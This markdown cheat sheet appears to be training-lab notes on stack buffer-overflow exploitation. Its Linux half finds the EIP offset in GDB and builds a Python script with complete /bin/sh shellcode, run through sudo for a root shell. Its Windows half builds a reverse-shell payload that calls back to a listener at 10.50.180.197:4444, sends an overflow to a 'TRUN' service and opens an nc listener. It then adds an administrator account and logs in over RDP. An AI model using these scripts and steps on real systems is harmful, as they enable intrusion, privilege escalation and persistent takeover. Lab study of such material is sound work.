# GDB Process -- Payload Crafting

## Linux Payload

### Extracting Info from Host

```bash
# Load binary in GDB
hostterminal$ gdb <filename>

# Show and clear environment variables
gdb: show env
gdb: unset env
```

### Finding the Offset

Before running the next step, go to [Wiremask Pattern Generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) and create your pattern.

```bash
# Run with the generated pattern to get the offset hex
gdb: r <insert pattern>
# This gets you the offset hex -- put it into Wiremask for the offset value and note it

# Get memory map info (copy start address from below heap and return address from above stack)
gdb: info proc map

# Search for jmp esp instruction between heap and stack addresses
gdb: find /b <0xf7de2000>,<0xf7ffe000>,0xff,0xe4
# Grab the top 3-5 results to be placed into the Python script
```

### Building the Payload with Metasploit

```bash
student@linops$ msfconsole

msf6$ use payload/linux/x86/exec
msf6$ set CMD '/bin/sh'
msf6$ generate -b "\x00" -f python
```

### Example Exploit Script

Once the payload is generated, copy and paste the output into a script file:

```python
#!/usr/bin/python

test = 'A' * 55                    # Overwrite registers up to the EIP
eip = '\x59\x3b\xde\xf7'          # Address from GDB recon (written in reverse byte order)

# Candidate addresses from find command:
# 0xf7de3b59
# 0xf7f588ab
# 0xf7f645fb
# 0xf7f6460f
# 0xf7f64aeb

nop = '\x90' * 10                  # NOP sled padding

# Payload generated from: payload(linux/x86/exec) > generate -b "\x00" -f python
buf =  b""
buf += b"\xbe\x18\x41\x31\x8f\xdb\xda\xd9\x74\x24\xf4\x58"
buf += b"\x33\xc9\xb1\x0f\x83\xe8\xfc\x31\x70\x0f\x03\x70"
buf += b"\x17\xa3\xc4\xe5\x2c\x7b\xbe\xa8\x54\x13\xed\x2f"
buf += b"\x11\x04\x85\x80\x52\xa3\x56\xb7\xbb\x51\x3e\x29"
buf += b"\x4a\x76\x92\x5d\x5a\x79\x13\x9e\x16\x16\x66\xfd"
buf += b"\xbe\xc8\xa7\x75\x53\x79\x97\x02\xc2\x17\x89\x89"
buf += b"\x66\xc6\x21\x2a\xf2\x16\x9d\x99\x73\xf7\xec\x9e"

print(test + eip + nop + buf)
```

### Deploying the Exploit

Transfer the script to the target:

```bash
# Option 1: SCP
scp exploit.py user2@10.50.16.14:~

# Option 2: HTTP server with proxychains
proxychains python3 -m http.server
```

Make the file executable and run it:

```bash
# Navigate to the directory where the file is located
user2@PublicFacingWebsite:/var/tmp$ sudo "./exploit_me" $(python exploit.py)
```

After successful exploitation, you get a root shell:

```bash
# Navigate to root home directory
cd
ls -l

# Switch to root if needed
su root

# Search for flags or sensitive files
root@PublicFacingWebsite:~# ls -l
```

---

## Windows Payload

### Building the Script with Metasploit

```bash
Student@lin-ops$ msfconsole

msf6 > use windows/shell_reverse_tcp
msf6 payloads(windows/shell_reverse_tcp) > set LHOST 10.50.180.197   # IP of your listening box
msf6 payloads(windows/shell_reverse_tcp) > set LPORT 4444
msf6 payloads(windows/shell_reverse_tcp) > generate -b "\x00" -f python
```

### Example Windows Exploit Script

```python
#!/usr/bin/python

import socket
command = "TRUN /.:/"

BUFF = "A" * 2003          # Offset -- update as needed per target

EIP = "\xA0\x12\x50\x62"   # Return address (reverse byte order)
# Candidate addresses:
# 0x625012A0
# 0x625012AD
# 0x625012BA

NOP = "\x90" * 10

# windows/shell_reverse_tcp payload
# LHOST=10.50.180.197, LPORT=4444
buf =  b""
buf += b"\xb8\xab\x84\x2c\x8c\xdd\xc0\xd9\x74\x24\xf4\x5b"
buf += b"\x31\xc9\xb1\x52\x31\x43\x12\x83\xc3\x04\x03\xe8"
# ... (full shellcode payload)
buf += b"\xeb\x8d\xa8\xf4"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.28.189", 9999))
print s.recv(1024)
s.send(command + BUFF + EIP + NOP + buf)
print s.recv(1024)
s.close()
```

### Executing the Windows Exploit

```bash
# Set up a listener on your local box
student@lin-ops:~$ proxychains nc -lvnp 4444

# From another terminal, run the script
student@lin-ops:~/Scripts$ proxychains ./Priveme.py
```

If successful, you get a shell:

```
C:\Windows\system32>
```

### Post-Exploitation: Adding Admin User

```cmd
C:\Windows\system32> net localgroup administrators <user> /add
```

### Accessing the Box via RDP

```bash
student@lin-ops:~/Scripts$ proxychains xfreerdp /v:<IP> /u:<USERNAME> /p:<PASSWORD> /size:1920x1000 +clipboard
```

### Windows Enumeration Commands

```cmd
auditpol /get /category:*
    :: Shows all audit category settings

auditpol /get /category:* | findstr /i "success failure"
    :: Show categories set for success, failure, or both

auditpol /list /subcategory:"detailed Tracking","DS Access"
    :: Display sub-policies for specific categories

auditpol /get /option:crashonauditfail
    :: Check if system crashes when auditing fails
```
